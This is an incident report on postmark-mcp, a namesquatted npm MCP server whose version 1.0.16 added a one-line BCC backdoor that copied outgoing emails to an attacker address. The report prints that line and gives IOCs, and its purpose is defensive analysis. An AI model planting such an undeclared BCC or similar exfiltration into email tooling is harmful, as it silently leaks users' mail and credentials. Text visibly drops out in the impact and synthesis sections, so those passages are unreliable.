# postmark-mcp: First In-the-Wild Malicious MCP Server Steals Emails via BCC Injection

## Executive Summary

On September 17, 2025, a malicious npm package called `postmark-mcp` became the first documented in-the-wild malicious MCP server. The attacker (npm user "phanpak", JSDOC author "Jabal Torres") cloned ActiveCampaign's legitimate Postmark MCP server from GitHub, published 15 clean versions to npm over two days to build trust, then injected a single-line BCC backdoor in version 1.0.16: `Bcc: 'phan@giftshop.club'`. Every email sent through the MCP server was silently copied to the attacker's address for 8 days until Koi Security's automated risk engine flagged behavioral changes on September 25, 2025. The package was removed from npm the same day. Impact is contested: Koi Security estimated approximately 300 affected organizations and 3,000-15,000 exfiltrated emails per day, but Postmark confirmed only one actual customer used the compromised package. With 1,643 total downloads across all versions and a single confirmed victim, actual severity is Medium -- but the precedent-setting nature of the first malicious MCP server is significant for the broader AI agent security landscape.

## What Happened

### Background

Postmark is a transactional email service owned by ActiveCampaign, used by SaaS companies, e-commerce platforms, and developer-tooling companies. ActiveCampaign maintained a legitimate Postmark MCP server on GitHub at `https://github.com/ActiveCampaign/postmark-mcp` -- but crucially, this server was not published to the npm registry. This gap between GitHub availability and npm presence created the attack surface.

### The Attack

The attacker exploited a naming collision. By registering the `postmark-mcp` package name on npm before ActiveCampaign did, the attacker filled an obvious gap that developers searching npm for a Postmark MCP integration would naturally find. This is namesquatting rather than typosquatting -- the package name was identical to what users would expect from the legitimate vendor, not a near-miss misspelling.

The attack followed a classic trust-building pattern:

1. **Clone and publish (September 15):** The attacker copied the legitimate Postmark MCP server code from ActiveCampaign's GitHub repository and published it to npm as `postmark-mcp` v1.0.0.

2. **Trust building (September 15-17):** Fifteen clean versions (1.0.0 through 1.0.15) were published in rapid succession, each functioning identically to the legitimate server. This created a version history that appeared active and well-maintained.

3. **Payload injection (September 17):** Version 1.0.16 introduced a single line of code added to the `sendEmail` tool handler, between the "From" and "ReplyTo" parameters:

```javascript
Bcc: 'phan@giftshop.club',
```

This ensured every outgoing email was silently blind-carbon-copied to the attacker's collection address. BCC headers are stripped from delivered email, making the exfiltration invisible to both senders and recipients.

4. **Continued operation (September 17-25):** The malicious versions remained live on npm for 8 days. Two additional malicious versions (1.0.17, 1.0.18) were published with the backdoor intact.

### The Discovery

Koi Security's automated risk engine flagged `postmark-mcp` when version 1.0.16 introduced behavioral changes that diverged from the established pattern of the previous 15 versions. Manual analysis by Koi Security researchers confirmed the BCC injection. The package was removed from npm the same day.

Koi Security CTO Idan Dardikman stated: "This is the world's first sighting of a real-world malicious MCP server" and "One developer. One line of code. Thousands upon thousands of stolen emails."

### Vendor Response

Postmark (ActiveCampaign) published an official response: "We want to be crystal clear: Postmark had absolutely nothing to do with this package or the malicious activity." They directed users to their legitimate MCP server on GitHub and recommended removing the fraudulent package, checking email logs, and rotating credentials. Critically, Postmark confirmed that only one of their actual customers had used the compromised package -- significantly qualifying Koi Security's estimate of approximately 300 affected organizations.

## Technical Analysis

### Attack Mechanism

The attack exploited three properties of the MCP ecosystem:

1. **No registry-level verification.** npm does not verify that a package named after a known service (e.g., "postmark-mcp") is actually published by that service's vendor. Any user can register any available package name.

2. **MCP servers execute with agent trust.** When an AI agent invokes tools on an MCP server, it trusts the server to faithfully execute the requested action. There is no mechanism for the agent or user to verify that the tool's implementation matches its declared interface -- a BCC field added to an email-sending function is invisible at the protocol level.

3. **No code review culture for MCP packages.** The backdoor was completely unobfuscated -- a plaintext BCC field in source code, trivially detectable by any human reading the code. Its survival for 8 days demonstrates that the MCP ecosystem lacked even basic code review norms for server packages. The attacker correctly assessed that nobody would look.

### What the Lack of Obfuscation Reveals

The most significant technical detail is what the attacker did not do. There was no code obfuscation, no encoded strings, no encrypted payloads, no dynamic code loading, no exfiltration through side channels. The backdoor was `Bcc: 'phan@giftshop.club'` in plaintext source code. This reveals the attacker's accurate threat model of the MCP ecosystem: security review was so uncommon that even the simplest possible backdoor would go undetected. The attacker invested effort in trust-building (15 clean versions) but zero effort in concealment -- because concealment was unnecessary.

This is a maturity indicator. In traditional npm supply chain attacks (event-stream, ua-parser-js), attackers typically use obfuscation, encrypted payloads, or multi-stage loaders. The postmark-mcp attacker used none of these because the MCP ecosystem had not yet developed the review practices that would make them necessary.

## Root Cause Analysis

**Proximate cause:** A malicious npm package impersonating a legitimate vendor's MCP server injected a single-line BCC backdoor that silently exfiltrated all email content to an attacker-controlled address.

**Why 1:** Why was the malicious package installed?
The legitimate Postmark MCP server existed on GitHub but was not published to npm. The attacker filled this gap by publishing the first `postmark-mcp` package on npm, which developers naturally found when searching for a Postmark MCP integration.

**Why 2:** Why did nobody detect the backdoor for 8 days?
The MCP ecosystem lacks code review practices, security scanning tools, and behavioral monitoring for server packages. No human or automated system reviewed the code between publication and Koi Security's detection.

**Why 3:** Why does the MCP ecosystem lack these security practices?
MCP is a new protocol (2024-2025) that grew rapidly before security tooling and practices could mature. The ecosystem prioritized functionality and adoption over security review. Package registries (npm) provide no MCP-specific security verification.

**Why 4:** Why does npm allow anyone to register package names that impersonate legitimate services?
npm operates on a first-come-first-served namespace model. There is no verification that a package named after a known service is published by that service's vendor. This is a long-standing npm design choice that predates MCP.

**Why 5 / Root cause:** The MCP ecosystem inherited npm's permissionless namespace model without adding any security layer for MCP server packages -- no code review requirements, no behavioral monitoring, no vendor verification, and no runtime sandboxing of tool implementations. The result is a supply chain where AI agents execute unverified code from unverified publishers with implicit trust.

## Impact Assessment

**Severity:** Medium

### Contested Impact Numbers

Impact is contested between the discoverer and the impersonated vendor:

- **Koi Security (discoverer) estimate:** Approximately 300 organizations integrated the package into real workflows, sending 3,000-15,000 emails per day, with potentially 24,000-120,000 emails exfiltrated over 8 days. - MFA/2FA codes
- Invoices and financial details

## How It Could Have Been Prevented

1. **Vendor-published official packages.** If ActiveCampaign had published their Postmark MCP server to npm under their own account, the `postmark-mcp` name would have been taken. The gap between GitHub availability and npm presence was the fundamental attack surface.

2. **MCP server provenance verification.** A mechanism to verify that an MCP server package is published by the service vendor it claims to integrate with would have flagged `postmark-mcp` as unaffiliated with Postmark/ActiveCampaign.

3. **Behavioral diff monitoring for MCP packages.** Automated tools that compare behavioral changes between package versions -- specifically detecting new network endpoints, email addresses, or data flows added in updates -- would have flagged the BCC addition in v1.0.16.

4. **Code review before MCP server deployment.** Manual or automated code review of MCP server source code before deployment would have caught the plaintext BCC field immediately. The backdoor required zero sophistication to detect.

5. **Runtime sandboxing of MCP tool implementations.** If the MCP protocol enforced that email-sending tools could only perform their declared function (send to specified recipients) and not add undeclared BCC fields, the exfiltration would have been blocked at the protocol level.

## How It Was / Could Be Fixed

**Actual remediation taken:**
- Koi Security published full disclosure with IOCs and remediation guidance
- Package removed from npm on September 25, 2025
- Postmark published official response identifying their legitimate MCP server
- Snyk published detailed technical analysis with remediation steps
- Semgrep published MCP security cheatsheet for developers
- Multiple security vendors (ReversingLabs, Qualys) issued advisories

**Required remediation for affected organizations:**
- Uninstall `postmark-mcp` and any cached versions
- Rotate all Postmark API tokens and SMTP credentials
- Rotate any downstream credentials that appeared in exfiltrated emails (password resets, MFA codes, API keys)
- Audit email logs for BCC traffic to giftshop[.]club
- Audit all other packages from "phanpak" (31 additional npm packages)
- Switch to the legitimate Postmark MCP server from ActiveCampaign's GitHub

**Important caveat:** Removing the package from npm does not remove already-installed instances. Any organization that installed v1.0.16-1.0.18 and did not actively update or uninstall remains compromised until manually remediated.

## Solutions Analysis

### 1. Vendor-First Package Publication

- **Type:** Preventive / Ecosystem Design
- **Plausibility:** 4/5 -- If ActiveCampaign had published their Postmark MCP server to npm first, the namesquatting attack surface would not exist. This is a well-understood solution from traditional npm security.
- **Practicality:** 3/5 -- Requires every service vendor to proactively publish and maintain npm packages for their MCP servers. Many vendors treat GitHub as sufficient distribution. The MCP ecosystem has no mechanism to prompt vendors to claim their npm namespace.
- **How it applies:** The attack exploited the gap between ActiveCampaign's GitHub repository and npm's first-come-first-served namespace. Vendor-published packages close this gap.
- **Limitations:** Does not prevent attacks against services that do not offer official MCP servers. Vendors must maintain npm packages alongside their primary distribution channel, adding operational burden.

### 2. Behavioral Diff Monitoring

- **Type:** Detective / Automated Security
- **Plausibility:** 5/5 -- This is exactly how the attack was discovered. Koi Security's automated risk engine flagged behavioral changes in v1.0.16. The approach is proven effective.
- **Practicality:** 3/5 -- Requires security vendors or registries to maintain behavioral analysis infrastructure for all MCP packages. Currently only specialized security firms (Koi Security) offer this capability. Not available to individual developers.
- **How it applies:** The BCC injection introduced a new email address in the tool's output that was not present in any previous version. Behavioral diff analysis detects exactly this type of change.
- **Limitations:** 8-day detection lag in this case. Depends on the granularity of behavioral models. May produce false positives for legitimate feature additions.

### 3. MCP Protocol-Level Tool Sandboxing

- **Type:** Architectural / Protocol Redesign
- **Plausibility:** 4/5 -- If the MCP protocol enforced that tool implementations could only perform their declared operations (e.g., an email tool sends to specified recipients only, no undeclared BCC fields), the exfiltration would be blocked at the protocol level.
- **Practicality:** 2/5 -- Requires fundamental changes to the MCP protocol specification. Current MCP design trusts server implementations entirely. Sandboxing would require runtime verification of tool outputs against declared schemas -- a significant engineering effort with performance implications.
- **How it applies:** The BCC field was not part of the tool's declared interface. Protocol-level output validation would detect and block undeclared fields.
- **Limitations:** Defining comprehensive output schemas for all tool types is difficult. Attackers could find ways to exfiltrate data within declared fields (e.g., appending data to the email body). This is a long-term ecosystem solution, not an immediate fix.

### 4. Mandatory Code Review for MCP Server Packages

- **Type:** Process / Governance
- **Plausibility:** 5/5 -- The backdoor was completely unobfuscated plaintext. Any human reading the source code would have caught it instantly. Code review is the simplest and most effective defense against this specific attack.
- **Practicality:** 4/5 -- For individual organizations, reviewing MCP server source code before deployment is straightforward. For the ecosystem at scale, mandatory registry-level code review for every package update is resource-intensive. Automated static analysis (grep for email addresses, network endpoints) could supplement human review.
- **How it applies:** A developer reviewing the diff between v1.0.15 and v1.0.16 would have seen `Bcc: 'phan@giftshop.club'` and immediately flagged it.
- **Limitations:** Does not scale to the entire npm ecosystem without automation. Obfuscated payloads would evade simple code review. This works because the attacker did not bother to obfuscate -- future attackers may be less lazy.

## Broader Context: MCP Security Landscape

The postmark-mcp incident occurred during a period of rapidly escalating MCP security incidents. AuthZed's timeline documents 14 major MCP breaches between April 2025 and April 2026, including WhatsApp exfiltration demos, GitHub prompt injection, Anthropic Inspector RCE, and Smithery hosting breaches. The postmark-mcp incident was the first to demonstrate real-world malicious intent rather than security research demonstrations or vulnerability disclosures.

The attack follows a well-established pattern from traditional npm supply chain security (event-stream 2018, ua-parser-js 2021) but adds a new dimension specific to MCP: AI agents autonomously execute MCP tool calls without human review of individual operations. As ReversingLabs noted, this creates "continuous access to multiple connected workflows rather than isolated compromises." The combination of autonomous execution, implicit trust in tool implementations, and a permissionless package registry creates an attack surface that is qualitatively different from traditional npm supply chain risks.

## Strategic Council Review

*Reviewed: 2026-05-05 | Confidence: High*

### Phase 1: Challenger

1. **"First malicious MCP server" claim is unfalsifiable.** "First documented" is not "first." The unobfuscated backdoor surviving 8 days suggests other malicious MCP servers could exist undetected. The headline and framing lean heavily on this "first" designation for impact beyond what confirmed evidence (1 customer) supports.

2. **Koi Security's impact estimates use aggressive assumptions.** Their methodology -- 1,500 weekly downloads with a 20% active deployment rate -- is speculative. Download counts include CI/CD, mirrors, bots, evaluations, and duplicates. A 20% deployment rate for an unverified package from an unknown publisher is implausibly high. The report should more directly challenge this methodology rather than presenting it alongside Postmark's data as equally credible.

3. **data_types_exposed list is speculative for confirmed impact.** With only 1 confirmed customer, there is no evidence all listed data types (credentials, MFA codes, financial data, PII, internal communications) were present in exfiltrated emails. This is what *could* be in transactional email generally, not what was confirmed exposed.

4. **Root cause analysis conflates MCP-specific and general npm problems.** The namesquatting attack would work identically for any npm package. The MCP-specific angle (agents execute tools with implicit trust) is an amplifying factor, not the root cause per se. The 5 Whys overfits to an MCP narrative when the vulnerability is fundamentally an npm namespace problem.

5. **Severity rating vs. framing tension.** Medium severity is defensible for confirmed impact, but headline_stat, executive summary, and broader context sections use language that reads as High severity. The framing oversells relative to the severity classification.

6. **31 other packages from phanpak are flagged but uninvestigated.** The report notes these as an IOC but does not investigate or list them. If backdoored, impact could be significantly larger; if clean, the attacker profile changes. This is an unresolved gap presented without acknowledgment.

### Phase 2: Steelman

1. **Medium severity with precedent-setting framing is the correct approach.** The report correctly separates confirmed impact (drives severity) from systemic significance (drives narrative). Rating based on unverified estimates would be irresponsible; rating Low would ignore genuine precedent. The report threads this needle well.

2. **The root cause analysis is appropriately layered.** MCP *could* have added verification on top of npm but did not -- this is the MCP-specific failure. A non-MCP namesquatting package requires human installation; an MCP server operates with agent-level trust and autonomous execution, amplifying impact. The root cause correctly identifies the MCP-specific gap rather than merely restating npm's known problems.

3. **Transparent handling of contested numbers is exemplary.** The report presents both estimates, explains methodology behind each, and states which drives severity. This is the gold standard for contested impact data -- neither sensationalizing the higher number nor dismissing it.

4. **The obfuscation-absence analysis is genuinely insightful.** The observation that zero obfuscation is itself an ecosystem maturity indicator -- and the comparison to event-stream/ua-parser-js where obfuscation was necessary -- is a meaningful analytical contribution valuable to security teams assessing MCP exposure.

5. **Source quality and breadth are strong.** Eleven sources including discoverer disclosure, vendor response, two independent security firms, a tooling vendor, and multiple independent journalists. No key claim relies on a single source.

### Phase 3: Synthesis

The draft is a strong incident report with genuine analytical contributions -- the obfuscation-absence analysis, transparent contested-impact handling, and layered root cause analysis. The core narrative is sound and well-sourced.

Three challenger points require attention. First, the data_types_exposed list in frontmatter should be qualified as potential exposure based on transactional email characteristics, not confirmed exposure for the single affected customer -- the body text is more careful than the YAML metadata. ## Key Takeaways

1. **The MCP ecosystem security gap is real, not theoretical.** postmark-mcp moved MCP security from hypothetical risk to demonstrated exploit. The fact that a plaintext, unobfuscated BCC injection survived 8 days undetected demonstrates that the ecosystem's security maturity is far behind its adoption rate.

2. **Trust-building before payload injection is a proven pattern now transplanted to MCP.** The 15 clean versions before the malicious v1.0.16 mirror event-stream and ua-parser-js attack patterns. MCP server packages should be treated with the same suspicion as any other supply chain dependency -- version updates require review, not blind trust.

3. **Vendors must claim their npm namespace.** ActiveCampaign's decision to publish their Postmark MCP server only on GitHub and not on npm created the fundamental attack surface. Every service vendor offering MCP integrations should proactively register and publish official packages on all major registries.

4. **Code review is the minimum viable defense.** The attacker invested zero effort in concealment because the ecosystem does not review code. Organizations deploying MCP servers must review source code before installation and diff every version update. This is not a sophisticated security practice -- it is basic software hygiene that the MCP ecosystem has not yet adopted.

5. **Contested impact numbers must be reported transparently.** Koi Security's "~300 organizations" estimate and Postmark's "one customer" confirmation are both sourced from credible parties with different vantage points. Security researchers estimate from download metrics; vendors know their actual customer usage. Neither is wrong -- they measure different things. Incident reports must present both and let readers assess.
